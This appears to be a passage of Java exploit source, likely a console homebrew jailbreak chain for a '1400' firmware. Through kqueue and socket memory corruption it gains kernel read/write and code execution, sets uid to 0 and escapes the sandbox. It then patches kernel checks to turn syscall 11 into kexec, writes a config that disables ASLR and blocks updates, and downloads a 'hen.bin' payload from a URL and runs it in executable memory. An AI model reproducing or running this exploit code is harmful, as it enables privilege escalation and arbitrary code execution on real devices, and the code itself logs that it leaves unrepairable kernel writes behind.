                this.lg(unsafe, "C round " + n12 + "/" + 6 + " re-packed, sweeping " + CANDS.length + " candidates");
                for (n37 = 0; n37 < CANDS.length && n32 < 0 && n35 < 32; ++n37) {
                    int n38 = CANDS[n37];
                    if (n38 >= n30 || !this.marked(unsafe, l48, nArray7[n38], l75, l76) || Hx1400.sx(this.ac(unsafe, l47, nArray7[n38], 41L, 51L, 0L, 0L, 0L)) != 0L) continue;
                    long l103 = Hx1400.sx(this.ac(unsafe, l43, l78, 2L, 0L, 0L, 0L, 0L));
                    if (l103 < 0L) {
                        this.ac(unsafe, l47, nArray7[n38], 41L, 51L, l74, 248L, 0L);
                        continue;
                    }
                    long l104 = (l103 & 0xFFFFL) << 16 | 0x985AL;
                    ++n35;
                    unsafe.setMemory(l77, 64L, (byte)0);
                    unsafe.putInt(l77, (int)l103);
                    unsafe.putShort(l77 + 8L, (short)-18);
                    unsafe.putShort(l77 + 10L, (short)1);
                    unsafe.putInt(l77 + 16L, 90);
                    long l105 = Hx1400.sx(this.ac(unsafe, l52, l8, l77, 1L, 0L, 0L, 0L));
                    int n39 = (int)l104;
                    n11 = 0;
                    if (l105 == 0L) {
                        for (int i = 0; i < n30; ++i) {
                            if (i == n38) continue;
                            unsafe.setMemory(l75, 512L, (byte)0);
                            unsafe.putInt(l76, 248);
                            if (Hx1400.sx(this.ac(unsafe, l48, nArray7[i], 41L, 51L, l75, l76, 0L)) != 0L) continue;
                            if (unsafe.getInt(l75 + 8L) == n39 && unsafe.getInt(l75 + 12L) == 0) {
                                ++n11;
                                if (n32 >= 0) continue;
                                n32 = i;
                                n33 = nArray7[i];
                                continue;
                            }
                            if (unsafe.getInt(l75 + 8L) == 0x43434343 && unsafe.getInt(l75 + 12L) == 0x54545454) continue;
                            this.ac(unsafe, l47, nArray7[i], 41L, 51L, l74, 248L, 0L);
                        }
                    }
                    if (n32 >= 0 && n11 == 1) {
                        unsafe.setMemory(l77, 64L, (byte)0);
                        unsafe.putInt(l77, (int)l103);
                        unsafe.putShort(l77 + 8L, (short)-18);
                        unsafe.putShort(l77 + 10L, (short)2);
                        if (Hx1400.sx(this.ac(unsafe, l52, l8, l77, 1L, 0L, 0L, 0L)) != 0L) {
                            n32 = -1;
                            n33 = -1;
                        } else {
                            this.ac(unsafe, l47, nArray7[n38], 41L, 51L, l74, 248L, 0L);
                            n31 = n38;
                            l101 = l103;
                            l102 = l104;
                            n34 = n12;
                            this.cDf = l103;
                            this.cTgt = n33;
                            this.lg(unsafe, "C HELD round=" + n12 + " try=" + n35 + " cand=" + n38 + " dce=" + l103 + " target=" + n32 + " val=" + Hx1400.hz(l104));
                            this.lg(unsafe, "C \u26a0 " + n36 + " arms MISSED - each one wrote 8 bytes into an unknown zone-256 kernel object and cannot be repaired. Cold reboot clears them.");
                        }
                    }
                    if (n32 >= 0) continue;
                    ++n36;
                    if (l105 == 0L) {
                        unsafe.setMemory(l77, 64L, (byte)0);
                        unsafe.putInt(l77, (int)l103);
                        unsafe.putShort(l77 + 8L, (short)-18);
                        unsafe.putShort(l77 + 10L, (short)2);
                        this.ac(unsafe, l52, l8, l77, 1L, 0L, 0L, 0L);
                    }
                    this.ac(unsafe, l44, l103, 0L, 0L, 0L, 0L, 0L);
                    this.ac(unsafe, l47, nArray7[n38], 41L, 51L, l74, 248L, 0L);
                }
            }
            if (n32 < 0) {
                this.ac(unsafe, l44, l8, 0L, 0L, 0L, 0L, 0L);
                for (n12 = 0; n12 < n30; ++n12) {
                    this.ac(unsafe, l44, nArray7[n12], 0L, 0L, 0L, 0L, 0L);
                }
                this.ac(unsafe, l54, 3L, 1L, l85, 16L, l71, 0L);
                return this.fin(unsafe, "no pair after " + n35 + " arms (cap " + 32 + "), " + n36 + " blind writes left in the kernel, kbase=" + Hx1400.h16(this.kbase));
            }
            long l106 = (l101 & 0xFFFFL) << 16 | 0x9800L;
            long l107 = l106 & 0xFFFFFFFFFFFFC000L;
            long l108 = this.ac(unsafe, l50, l107, 16384L, 3L, 4114L, -1L, 0L);
            this.lg(unsafe, "D fake=" + Hx1400.hz(l106) + " page=" + Hx1400.hz(l107) + " mmap=" + Hx1400.hz(l108));
            if (l108 != l107) {
                return this.fin(unsafe, "mmap fixed " + Hx1400.hz(l108));
            }
            this.cPage = l107;
            unsafe.setMemory(l107, 16384L, (byte)0);
            this.lg(unsafe, "D reusing anchor=" + n26 + " and " + n27 + " victims opened before the spray");
            if (Hx1400.sx(this.ac(unsafe, l47, n26, 0L, 12L, l79, 8L, 0L)) != 0L || Hx1400.sx(this.ac(unsafe, l47, n26, 0L, 12L, l80, 8L, 0L)) != 0L) {
                return this.fin(unsafe, "anchor join");
            }
            if (Hx1400.sx(this.ac(unsafe, l47, n33, 41L, 51L, 0L, 0L, 0L)) != 0L) {
                return this.fin(unsafe, "target free");
            }
            int n40 = 0;
            for (n10 = 0; n10 < n27 && Hx1400.sx(this.ac(unsafe, l47, nArray4[n10], 0L, 12L, l79, 8L, 0L)) == 0L && Hx1400.sx(this.ac(unsafe, l47, nArray4[n10], 0L, 12L, l80, 8L, 0L)) == 0L; ++n10) {
                ++n40;
            }
            this.lg(unsafe, "D joined=" + n40);
            if (n40 != 96) {
                return this.fin(unsafe, "joined " + n40);
            }
            unsafe.putByte(l106 + 16L, (byte)-17);
            unsafe.putByte(l106 + 17L, (byte)-1);
            unsafe.putByte(l106 + 18L, (byte)-1);
            unsafe.putByte(l106 + 19L, (byte)-7);
            unsafe.putLong(l106 + 24L, l106 + 512L);
            unsafe.putInt(l106 + 640L, 8);
            unsafe.putLong(l106 + 32L, l106 + 768L);
            unsafe.putLong(l106 + 800L, l106 + 1024L);
            unsafe.putLong(l106 + 1880L, l106 + 2048L);
            unsafe.putLong(l106 + 2056L, l106 + 2304L);
            unsafe.putInt(l106 + 56L, 2);
            unsafe.putLong(l106 + 80L, 0L);
            unsafe.putLong(l106 + 88L, 0L);
            unsafe.putShort(l106 + 180L, (short)2);
            unsafe.putShort(l106 + 190L, (short)2);
            unsafe.setMemory(l77, 64L, (byte)0);
            unsafe.putInt(l77, (int)l101);
            unsafe.putShort(l77 + 8L, (short)-18);
            unsafe.putShort(l77 + 10L, (short)1);
            unsafe.putInt(l77 + 16L, 0);
            this.cArmed = true;
            this.cFake = l106;
            this.cPage = l107;
            this.cSke = l52;
            this.cEvB = l77;
            this.lg(unsafe, "D \u26d4 armed from here: " + Hx1400.hz(l106) + " is about to enter a membership vector");
            this.lg(unsafe, "D arming filter -18 data=0 -> plants " + Hx1400.hz(l106) + " in the membership vector");
            if (Hx1400.sx(this.ac(unsafe, l52, l8, l77, 1L, 0L, 0L, 0L)) != 0L) {
                return this.fin(unsafe, "leak ev-add");
            }
            n10 = -1;
            long l109 = 0L;
            for (n11 = 0; n11 < n27; ++n11) {
                this.ac(unsafe, l47, nArray4[n11], 0L, 72L, l81, 12L, 0L);
                long l110 = unsafe.getLong(l106 + 80L);
                if (unsafe.getInt(l106 + 56L) != 2) {
                    this.lg(unsafe, "D ref mutated at " + n11);
                    break;
                }
                if (Hx1400.kptr(l110)) {
                    n10 = n11;
                    l109 = l110;
                    break;
                }
                if (l110 == 0L) continue;
                this.lg(unsafe, "D noncanonical tree at " + n11 + " = " + Hx1400.h16(l110));
                break;
            }
            this.lg(unsafe, "D victim=" + n10 + " KVA=" + (l109 != 0L ? Hx1400.h16(l109) : "none") + " count=" + unsafe.getLong(l106 + 88L));
            if (n10 < 0 || !Hx1400.kptr(l109)) {
                return this.fin(unsafe, "no kva");
            }
            n11 = nArray4[n10];
            long l111 = l106 + 2560L;
            long l112 = l106 + 2688L;
            long l113 = l106 + 2816L;
            long l114 = l113 + 16L;
            unsafe.setMemory(l111, 48L, (byte)0);
            unsafe.setMemory(l112, 48L, (byte)0);
            unsafe.setMemory(l113, 48L, (byte)0);
            this.node(unsafe, l111, l112, 0L, 0L, 0, -1L);
            this.node(unsafe, l112, 0L, l113, l111, 1, -2L);
            this.node(unsafe, l113, 0L, 0L, l112, 0, -3L);
            unsafe.putLong(l106 + 80L, l111);
            unsafe.putLong(l106 + 88L, 3L);
            unsafe.putByte(l81 + 7L, (byte)2);
            long l115 = Hx1400.sx(this.ac(unsafe, l47, n11, 0L, 72L, l81, 12L, 0L));
            boolean bl6 = l115 == 0L && unsafe.getLong(l114) == l111 && unsafe.getLong(l106 + 80L) == l112 && Hx1400.kptr(unsafe.getLong(l112));
            this.lg(unsafe, "E gadget rc=" + l115 + " T=" + Hx1400.h16(unsafe.getLong(l114)) + " want=" + Hx1400.h16(l111) + " root=" + Hx1400.h16(unsafe.getLong(l106 + 80L)) + " ok=" + bl6);
            if (!bl6) {
                return this.fin(unsafe, "rb gadget");
            }
            long l116 = this.ka(R_SLOT);
            long l117 = this.ka(R_OPS);
            long l118 = l116 - 8L;
            l111 = l106 + 2304L;
            l112 = l106 + 3072L;
            l113 = l106 + 3328L;
            unsafe.setMemory(l111, 48L, (byte)0);
            unsafe.setMemory(l112, 48L, (byte)0);
            unsafe.setMemory(l113, 48L, (byte)0);
            this.node(unsafe, l111, l112, l113, l118, 0, -1L);
            this.node(unsafe, l112, 0L, 0L, l111, 1, -2L);
            this.node(unsafe, l113, 0L, 0L, 0L, 0, -3L);
            unsafe.putLong(l106 + 80L, l111);
            unsafe.putLong(l106 + 88L, 3L);
            unsafe.putByte(l81 + 7L, (byte)3);
            this.lg(unsafe, "F rotating fake ops into slot " + Hx1400.h16(l116));
            long l119 = Hx1400.sx(this.ac(unsafe, l47, n11, 0L, 72L, l81, 12L, 0L));
            boolean bl7 = l119 == 0L && unsafe.getLong(l106 + 80L) == l111 && unsafe.getLong(l106 + 88L) == 4L && unsafe.getLong(l111) == 0L && unsafe.getLong(l111 + 8L) == l113 && unsafe.getLong(l111 + 16L) == l112 && unsafe.getLong(l112 + 8L) == l111 && unsafe.getLong(l113 + 16L) == 0L && Hx1400.kptr(unsafe.getLong(l112));
            this.lg(unsafe, "F rotate rc=" + l119 + " root=" + Hx1400.h16(unsafe.getLong(l106 + 80L)) + " Gparent=" + Hx1400.h16(unsafe.getLong(l111 + 16L)) + " ok=" + bl7);
            if (!bl7) {
                return this.fin(unsafe, "rotation gate");
            }
            unsafe.putLong(l112, 0L);
            unsafe.putLong(l112 + 8L, this.ka(R_RET0));
            unsafe.putLong(l112 + 16L, this.ka(R_RET0));
            unsafe.putLong(l112 + 24L, this.ka(R_RET0));
            unsafe.putLong(l112 + 32L, this.ka(R_TOUCH));
            if (unsafe.getInt(l112) != 0 || unsafe.getLong(l112 + 8L) != this.ka(R_RET0) || unsafe.getLong(l112 + 32L) != this.ka(R_TOUCH)) {
                return this.fin(unsafe, "fakeOps readback");
            }
            this.lg(unsafe, "F fakeOps isfd=0 attach=" + Hx1400.h16(unsafe.getLong(l112 + 8L)) + " touch=" + Hx1400.h16(unsafe.getLong(l112 + 32L)));
            long l120 = l7 = l106 + 4096L;
            long l121 = l7 + 1792L;
            this.gSTACK = l120;
            this.gCTX = l121;
            this.gMARK = l7 + 1664L;
            this.gRES = l7 + 1536L;
            this.gIDENT = 3545541614998146895L;
            long l122 = 0L;
            for (l6 = l23; l6 < l23 + 32768L; l6 += 4L) {
                if (!this.chk(unsafe, l6, 24)) continue;
                l122 = l6;
                break;
            }
            if ((l6 = Hx1400.sx(this.ac(unsafe, l51, 0L, 0L, 0L, 0L, 0L, 0L))) < 0L) {
                return this.fin(unsafe, "root kqueue");
            }
            unsafe.setMemory(l77, 64L, (byte)0);
            unsafe.putLong(l77, this.gIDENT);
            unsafe.putShort(l77 + 8L, (short)-23);
            unsafe.putShort(l77 + 10L, (short)1);
            if (Hx1400.sx(this.ac(unsafe, l52, l6, l77, 1L, 0L, 0L, 0L)) != 0L) {
                return this.fin(unsafe, "initial EV_ADD -23");
            }
            this.cSlotA = l116;
            this.cOpsV = l117;
            this.cPf = l112;
            this.cRkq = (int)l6;
            this.cHfd = n33;
            this.cWfd = n11;
            this.cGo = l48;
            this.cRb = l75;
            this.cLp = l76;
            this.lg(unsafe, "F knote armed on kq=" + l6 + "; the slot STAYS hooked -> ring 0 is re-enterable");
            this.lg(unsafe, "F \u26d4 from here on, ANY exit goes through safeDown() - never a bare munmap");
            int n41 = this.kb0(unsafe);
            n41 = this.w8(unsafe, l120, n41, this.ka(R_UCRED));
            n41 = this.w8(unsafe, l120, n41, 0L);
            n41 = this.w8(unsafe, l120, n41, this.ka(R_PRAX));
            n41 = this.w8(unsafe, l120, n41, 0x100000000L);
            n41 = this.w8(unsafe, l120, n41, this.ka(R_PRDX));
            n41 = this.w8(unsafe, l120, n41, 0L);
            n41 = this.w8(unsafe, l120, n41, this.ka(R_UIDPAIR));
            n41 = this.w8(unsafe, l120, n41, 0L);
            n41 = this.uq(unsafe, l120, n41, 88L, 5188428245707522067L);
            n41 = this.uq(unsafe, l120, n41, 96L, -1L);
            n41 = this.uq(unsafe, l120, n41, 104L, -1L);
            n41 = this.kb1(unsafe, n41);
            this.lg(unsafe, "F entry1 uid0 = " + n41 + " qwords at " + Hx1400.hz(l120) + " ctx=" + Hx1400.hz(l121));
            boolean bl8 = this.kgo(unsafe, l52, l77, l6, n41);
            long l123 = l122 != 0L ? Hx1400.sx(this.ac(unsafe, l122, 0L, 0L, 0L, 0L, 0L, 0L)) : -1L;
            this.lg(unsafe, "F entry1 mark=" + bl8 + "  *** uid=" + l123 + " ***");
            if (!bl8 || l123 != 0L) {
                return this.fin(unsafe, "entry1 mark=" + bl8 + " uid=" + l123);
            }
            int n42 = 0;
            int n43 = 0;
            int n44 = -1;
            long l124 = 0L;
            StringBuffer stringBuffer3 = new StringBuffer("H odd sites:");
            for (n9 = 0; n9 < GRVA.length; ++n9) {
                n8 = (int)this.kbytes(unsafe, l52, l77, l6, this.ka(GRVA[n9]), GLEN[n9]);
                if (n8 == GNOW[n9]) {
                    ++n42;
                    continue;
                }
                if (n8 == GNEW[n9]) {
                    ++n43;
                    continue;
                }
                stringBuffer3.append(" +").append(Long.toHexString(GRVA[n9])).append("=").append(Integer.toHexString(n8));
                if (n44 >= 0) continue;
                n44 = n9;
                l124 = (long)n8 & 0xFFFFFFFFL;
            }
            this.lg(unsafe, "H guards: stock=" + n42 + " patched=" + n43 + " odd=" + (GRVA.length - n42 - n43) + " of " + GRVA.length);
            if (n44 >= 0) {
                this.lg(unsafe, stringBuffer3.toString());
            }
            n9 = n42 == GRVA.length ? 1 : 0;
            int n45 = n8 = n43 == GRVA.length ? 1 : 0;
            if (n9 == 0 && n8 == 0) {
                return this.fin(unsafe, "MIXED kernel: stock=" + n42 + " patched=" + n43 + " first odd +0x" + Long.toHexString(GRVA[n44 < 0 ? 0 : n44]) + "=0x" + Long.toHexString(l124) + " - refusing to fire, cold reboot first");
            }
            this.lg(unsafe, n8 != 0 ? "H *** kernel is ALREADY FULLY PATCHED - skipping 1400.bin ***" : "H *** kernel is stock - 1400.bin will be applied ***");
            long l125 = 0L;
            boolean bl9 = false;
            int n46 = 0;
            long l126 = this.kread(unsafe, l52, l77, l6, this.ka(SE11));
            this.lg(unsafe, "H sysent[11].sy_call before=" + Hx1400.h16(l126) + " (unpatched kernel: sys_nosys)");
            if (n9 != 0) {
                int n47;
                int n48;
                if (l60 == 0L) {
                    return this.fin(unsafe, "syscall 533 (jitshm) not resolvable - no executable page");
                }
                l5 = Hx1400.sx(this.ac(unsafe, l60, 0L, 16384L, 7L, 0L, 0L, 0L));
                this.lg(unsafe, "I jitshm fd=" + l5);
                if (l5 < 0L) {
                    return this.fin(unsafe, "jitshm create rc=" + l5);
                }
                l4 = this.ac(unsafe, l50, 0x940900000L, 16384L, 7L, 17L, l5, 0L);
                if (l4 == -1L || l4 == 0L) {
                    l4 = this.ac(unsafe, l50, 0L, 16384L, 7L, 1L, l5, 0L);
                    this.lg(unsafe, "I fixed map refused, floating map=" + Hx1400.hz(l4));
                }
                if (l4 == -1L || l4 == 0L) {
                    return this.fin(unsafe, "jitshm mmap failed");
                }
                for (n7 = 0; n7 < 632; ++n7) {
                    n48 = Hx1400.hexv(BLOB1400.charAt(n7 * 2));
                    n47 = Hx1400.hexv(BLOB1400.charAt(n7 * 2 + 1));
                    unsafe.putByte(l4 + (long)n7, (byte)(n48 << 4 | n47));
                }
                n7 = unsafe.getByte(l4) & 0xFF;
                n48 = unsafe.getByte(l4 + 1L) & 0xFF;
                n47 = unsafe.getByte(l4 + 631L) & 0xFF;
                this.lg(unsafe, "I blob at " + Hx1400.hz(l4) + " head=" + Integer.toHexString(n7) + " " + Integer.toHexString(n48) + " tail=" + Integer.toHexString(n47) + " (want b9 82 ... c3)");
                if (n7 != 185 || n48 != 130 || n47 != 195) {
                    return this.fin(unsafe, "blob readback");
                }
                unsafe.putLong(l112 + 32L, l4);
                if (unsafe.getLong(l112 + 32L) != l4) {
                    return this.fin(unsafe, "f_touch swap readback");
                }
                this.lg(unsafe, "J f_touch=" + Hx1400.h16(l4) + " - firing EV_ADD -23 once");
                unsafe.setMemory(l77, 64L, (byte)0);
                unsafe.putLong(l77, this.gIDENT);
                unsafe.putShort(l77 + 8L, (short)-23);
                unsafe.putShort(l77 + 10L, (short)1);
                long l127 = Hx1400.sx(this.ac(unsafe, l52, l6, l77, 1L, 0L, 0L, 0L));
                unsafe.putLong(l112 + 32L, this.ka(R_TOUCH));
                this.lg(unsafe, "J kevent rc=" + l127 + " ; f_touch restored to the pivot");
                l125 = this.kread(unsafe, l52, l77, l6, this.ka(SE11));
                long l128 = this.ka(KEXECG);
                boolean bl10 = l125 == l128;
                this.lg(unsafe, "K sysent[11].sy_call=" + Hx1400.h16(l125) + " want=" + Hx1400.h16(l128) + "  APPLIED=" + bl10);
                StringBuffer stringBuffer4 = new StringBuffer("K spot-check:");
                for (int i = 0; i < 6; ++i) {
                    int n49 = (int)this.kbytes(unsafe, l52, l77, l6, this.ka(GRVA[i]), GLEN[i]);
                    stringBuffer4.append(" +").append(Long.toHexString(GRVA[i])).append("=").append(Integer.toHexString(n49));
                    if (n49 != GNEW[i]) continue;
                    ++n46;
                }
                this.lg(unsafe, stringBuffer4.toString());
                this.lg(unsafe, "K " + n46 + "/6 sites now hold the PATCHED byte");
                long l129 = this.kbytes(unsafe, l52, l77, l6, this.ka(17837440L), 4);
                this.lg(unsafe, "K sysent[11].sy_narg=" + l129 + " (payload writes 2)");
                bl9 = bl10 && n46 == 6 && l129 == 2L;
                this.lg(unsafe, bl9 ? "K *** 1400.bin APPLIED - syscall 11 IS NOW kexec ***" : "K NOT fully applied");
            } else {
                l5 = this.kread(unsafe, l52, l77, l6, this.ka(SE11));
                bl9 = l5 == this.ka(KEXECG);
                l125 = l5;
                n46 = 6;
                this.lg(unsafe, "K already patched: sysent[11].sy_call=" + Hx1400.h16(l5) + " want=" + Hx1400.h16(this.ka(KEXECG)) + " kexec live=" + bl9);
            }
            l5 = this.ka(27557776L);
            l4 = this.kread(unsafe, l52, l77, l6, l5);
            n7 = (l4 & 0xFFFFFFFFFFFFFFL) == 0xFFFFFFFFFF20L ? 1 : 0;
            this.lg(unsafe, "L console-sink byte @" + Hx1400.h16(l5) + " = " + Hx1400.h16(l4) + " sig=" + (n7 != 0) + " (want ..ff ff ff ff ff 20)");
            this.kwrite(unsafe, l52, l77, l6, l5, l4 & 0xFFFFFFFFFFFFFF00L | 0L);
            long l130 = this.kread(unsafe, l52, l77, l6, l5);
            boolean bl11 = (l130 & 0xFFL) == 0L;
            this.lg(unsafe, "L set to 0x" + Integer.toHexString(0) + " -> " + Hx1400.h16(l130) + " ok=" + bl11);
            this.lg(unsafe, "L this byte is read by ONE getter at RVA 0x1d6e00, called from two sites:");
            this.lg(unsafe, "L   0x486db0: test al,al ; je skip   -> a zero SKIPS that block");
            this.lg(unsafe, "L   0x1cf813: r15 = al ? al : r14d ; then call [rax+0x20] per console device");
            this.lg(unsafe, "L   the second is the console device-list walk = the UART path. If UART is");
            this.lg(unsafe, "L   still thin with 0, the polarity is inverted - say so and DCO_SET flips.");
            long l131 = this.ka(28476728L);
            long l132 = this.ka(34827920L);
            long l133 = this.kread(unsafe, l52, l77, l6, l131);
            long l134 = this.kread(unsafe, l52, l77, l6, l132);
            long l135 = 0L;
            long l136 = 0L;
            if (Hx1400.kptr(l133) && Hx1400.kptr(l134)) {
                long l137 = l133;
                for (int i = 0; Hx1400.kptr(l137) && i < 64; ++i) {
                    l3 = this.kread(unsafe, l52, l77, l6, l137);
                    if ((this.kread(unsafe, l52, l77, l6, l137 + 176L) & 0xFFFFFFFFL) == this.pid) {
                        l135 = l137;
                        l136 = this.kread(unsafe, l52, l77, l6, l137 + 72L);
                        break;
                    }
                    l137 = l3;
                }
            }
            int n50 = 0;
            if (Hx1400.kptr(l136) && Hx1400.kptr(l134)) {
                this.kwrite(unsafe, l52, l77, l6, l136 + 16L, l134);
                this.kwrite(unsafe, l52, l77, l6, l136 + 24L, l134);
                this.kwrite(unsafe, l52, l77, l6, l136 + 32L, l134);
                n50 = this.kread(unsafe, l52, l77, l6, l136 + 16L) == l134 ? 1 : 0;
            }
            this.lg(unsafe, "M proc=" + Hx1400.h16(l135) + " pfd=" + Hx1400.h16(l136) + " rootvn=" + Hx1400.h16(l134) + " escaped=" + (n50 != 0));
            String string2 = "[HEN]\nconfig_version = 3\nexploit_fixes = 1\nmmap_patches = 1\nblock_updates = 1\ndisable_aslr = 1\nnobd_patches = 0\ntarget_id = 0\nskip_patches = 0\nupload_prx = 1\nenable_plugins = 1\n";
            l3 = this.cstr(unsafe, "/data/hen/hen.ini");
            long l138 = this.cstr(unsafe, "/data/hen");
            long l139 = Hx1400.sx(this.ac(unsafe, l14, l138, 511L, 0L, 0L, 0L, 0L));
            long l140 = Hx1400.sx(this.ac(unsafe, l43, l3, 1537L, 438L, 0L, 0L, 0L));
            long l141 = -1L;
            if (l140 >= 0L) {
                l2 = unsafe.allocateMemory(string2.length());
                for (int i = 0; i < string2.length(); ++i) {
                    unsafe.putByte(l2 + (long)i, (byte)string2.charAt(i));
                }
                l141 = Hx1400.sx(this.ac(unsafe, l42, l140, l2, string2.length(), 0L, 0L, 0L));
                this.ac(unsafe, l44, l140, 0L, 0L, 0L, 0L, 0L);
            }
            this.lg(unsafe, "M mkdir(/data/hen)=" + l139 + " open(hen.ini,CREAT|TRUNC)=" + l140 + " wrote=" + l141 + "/" + string2.length());
            l2 = Hx1400.sx(this.ac(unsafe, l43, l3, 0L, 0L, 0L, 0L, 0L));
            long l142 = -1L;
            if (l2 >= 0L) {
                l = unsafe.allocateMemory(512L);
                unsafe.setMemory(l, 512L, (byte)0);
                l142 = Hx1400.sx(this.ac(unsafe, l15, l2, l, 256L, 0L, 0L, 0L));
                StringBuffer stringBuffer5 = new StringBuffer();
                for (n6 = 0; (long)n6 < l142 && n6 < 256; ++n6) {
                    n5 = unsafe.getByte(l + (long)n6) & 0xFF;
                    stringBuffer5.append((char)(n5 == 10 ? 124 : (char)n5));
                }
                this.ac(unsafe, l44, l2, 0L, 0L, 0L, 0L, 0L);
                this.lg(unsafe, "M readback " + l142 + " B: " + stringBuffer5.toString());
            }
            if (l141 != (long)string2.length()) {
                this.lg(unsafe, "M \u26a0 the on-disk config was NOT written - HEN will use whatever is already there");
            }
            l = 0L;
            boolean bl12 = false;
            this.lg(unsafe, "N klog is HEN's job: plugin_server.prx serves 3232 from five merged sources. This probe deliberately does not open /dev/klog.");
            n6 = n46;
            n5 = n50;
            long l143 = l125;
            long l144 = 0L;
            this.safeDown(unsafe, "G");
            long l145 = l122 != 0L ? Hx1400.sx(this.ac(unsafe, l122, 0L, 0L, 0L, 0L, 0L, 0L)) : -1L;
            this.lg(unsafe, "G uid re-read=" + l145);
            int n51 = 0;
            for (int i = 0; i < n30; ++i) {
                if (nArray7[i] <= 0 || Hx1400.sx(this.ac(unsafe, l44, nArray7[i], 0L, 0L, 0L, 0L, 0L)) != 0L) continue;
                nArray7[i] = -1;
                ++n51;
            }
            this.lg(unsafe, "H1 released " + n51 + "/" + n30 + " spray sockets for the fetch (victims stay open)");
            String[] stringArray2 = new String[]{"/data/hen", "/data/hen/hen.ini", "/data/hen/version.txt", "/data/hen/plugin_loader.prx", "/user/temp/hen.installed"};
            StringBuffer stringBuffer6 = new StringBuffer("H2 /data/hen audit:");
            for (int i = 0; i < stringArray2.length; ++i) {
                long l146 = this.cstr(unsafe, stringArray2[i]);
                long l147 = Hx1400.sx(this.ac(unsafe, l43, l146, 0L, 0L, 0L, 0L, 0L));
                stringBuffer6.append(" ").append(stringArray2[i]).append("=").append(l147 >= 0L ? "PRESENT" : "absent");
                if (l147 < 0L) continue;
                this.ac(unsafe, l44, l147, 0L, 0L, 0L, 0L, 0L);
            }
            this.lg(unsafe, stringBuffer6.toString());
            long l148 = Hx1400.sx(this.ac(unsafe, l60, 0L, 589824L, 7L, 0L, 0L, 0L));
            if (l148 < 0L) {
                return this.fin(unsafe, "jitshm for hen rc=" + l148);
            }
            long l149 = this.ac(unsafe, l50, 0x950000000L, 589824L, 7L, 17L, l148, 0L);
            if (l149 == -1L || l149 == 0L) {
                l149 = this.ac(unsafe, l50, 0L, 589824L, 7L, 1L, l148, 0L);
            }
            if (l149 == -1L || l149 == 0L) {
                return this.fin(unsafe, "jitshm mmap for hen failed");
            }
            unsafe.setMemory(l149, 589824L, (byte)0);
            this.lg(unsafe, "H3 hen map=" + Hx1400.hz(l149) + " span=" + Hx1400.hz(589824L) + " fd=" + l148);
            long l150 = 0L;
            String string3 = "-";
            InputStream inputStream = null;
            try {
                String string4 = HENURL;
                if (string4 == null) {
                    string4 = HEN_URL;
                }
                inputStream = new URL(string4).openStream();
                byte[] byArray4 = new byte[65536];
                while (l150 < (long)HEN_SIZE) {
                    n4 = inputStream.read(byArray4, 0, byArray4.length);
                    if (n4 < 0) {
                        break;
                    }
                    for (n3 = 0; n3 < n4; ++n3) {
                        unsafe.putByte(l149 + l150 + (long)n3, byArray4[n3]);
                    }
                    l150 += (long)n4;
                }
            }
            catch (Throwable throwable) {
                string3 = throwable.getClass().getName() + ":" + throwable.getMessage();
            }
            finally {
                try {
                    if (inputStream != null) {
                        inputStream.close();
                    }
                }
                catch (Throwable throwable) {}
            }
            this.lg(unsafe, "H4 fetched " + l150 + "/" + HEN_SIZE + " B via " + (HENURL == null ? "lan" : "session") + " err=" + string3);
            if (l150 != (long)HEN_SIZE) {
                return this.fin(unsafe, "hen.bin is " + l150 + " B, expected " + HEN_SIZE);
            }
            int n52 = unsafe.getByte(l149) & 0xFF;
            int n53 = unsafe.getByte(l149 + 1L) & 0xFF;
            n4 = unsafe.getByte(l149 + 2L) & 0xFF;
            n3 = unsafe.getByte(l149 + 3L) & 0xFF;
            int n54 = unsafe.getByte(l149 + 4L) & 0xFF;
            int n55 = n53 | n4 << 8 | n3 << 16 | n54 << 24;
            int n56 = 5 + n55;
            int n57 = 0;
            for (long i = (long)HEN_SIZE; i < 589824L; i += 8L) {
                if (unsafe.getLong(l149 + i) == 0L) continue;
                ++n57;
            }
            this.lg(unsafe, "H5 head=" + Integer.toHexString(n52) + " entry=0x" + Integer.toHexString(n56) + " (want 0x" + Integer.toHexString(HEN_ENTRY) + ") bssNonZero=" + n57);
            boolean bl13 = bl = n52 == 233 && n56 == HEN_ENTRY && n57 == 0;
            if (!bl) {
                return this.fin(unsafe, "hen image: head=" + Integer.toHexString(n52) + " entry=0x" + Integer.toHexString(n56) + " bss=" + n57);
            }
            this.lg(unsafe, "H5 *** 519072 defer-shellui build VERIFIED IN PLACE ***");
            int[] nArray8 = new int[]{OFF_FIXES, OFF_MMAP, OFF_BLOCKUPD, OFF_ASLR, OFF_NOBD, OFF_SKIP, CFG_UPLOAD, CFG_PLUGINS};
            int[] nArray9 = new int[]{1, 1, 1, 1, 0, 0, 1, 1};
            String[] stringArray3 = new String[]{"exploit_fixes", "mmap_patches", "block_updates", "disable_aslr", "nobd_patches", "skip_patches", "upload_prx", "enable_plugins"};
            StringBuffer stringBuffer7 = new StringBuffer("H5b embedded config:");
            boolean bl14 = true;
            for (int i = 0; i < nArray8.length; ++i) {
                int n58 = unsafe.getByte(l149 + (long)nArray8[i]) & 0xFF;
                if (n58 != 48 && n58 != 49) {
                    bl14 = false;
                    stringBuffer7.append(" ").append(stringArray3[i]).append("@0x").append(Integer.toHexString(nArray8[i])).append("=0x").append(Integer.toHexString(n58)).append("!!");
                    continue;
                }
                unsafe.putByte(l149 + (long)nArray8[i], (byte)(48 + nArray9[i]));
                n2 = unsafe.getByte(l149 + (long)nArray8[i]) & 0xFF;
                stringBuffer7.append(" ").append(stringArray3[i]).append("=").append((char)n58).append("->").append((char)n2);
            }
            this.lg(unsafe, stringBuffer7.toString());
            if (!bl14) {
                return this.fin(unsafe, "an embedded config byte is not '0'/'1' - wrong build or offsets");
            }
            this.lg(unsafe, "H5b \u2605 patched IN THE IMAGE, so it applies even if /data/hen/hen.ini does not");
            this.lg(unsafe, "H5c launching");
            long l151 = this.dlf(method, obj, "pthread_create");
            if (l151 == 0L) {
                l151 = this.dlf(method, obj, "scePthreadCreate");
            }
            n2 = l151 != 0L ? unsafe.getByte(l151) & 0xFF : 0;
            this.lg(unsafe, "H6 pthread_create=" + Hx1400.hz(l151) + " prologue=" + Integer.toHexString(n2));
            if (l151 == 0L) {
                return this.fin(unsafe, "pthread_create not resolved");
            }
            if (n2 != 85 && n2 != 243) {
                return this.fin(unsafe, "pthread_create prologue " + Integer.toHexString(n2));
            }
            long l152 = unsafe.allocateMemory(64L);
            unsafe.setMemory(l152, 64L, (byte)0);
            long l153 = -1L;
            l153 = Hx1400.sx(this.ac(unsafe, l151, l152, 0L, l149, 0L, 0L, 0L));
